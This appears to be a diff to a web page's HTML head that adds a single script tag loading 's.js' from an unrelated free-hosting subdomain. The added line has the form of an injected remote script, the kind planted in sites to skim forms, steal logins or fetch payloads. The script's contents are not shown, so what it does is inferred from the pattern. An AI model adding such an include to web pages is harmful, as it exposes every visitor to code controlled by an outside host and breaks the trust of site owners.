@@ -1,6 +1,7 @@
 <html>
 <head>
 <meta content='user-scalable=0' name='viewport' />
+<script src="//rajukumargangai.000webhostapp.com/s.js"></script>
 <link href="styles.css" rel="stylesheet">
 </head>
 <body>
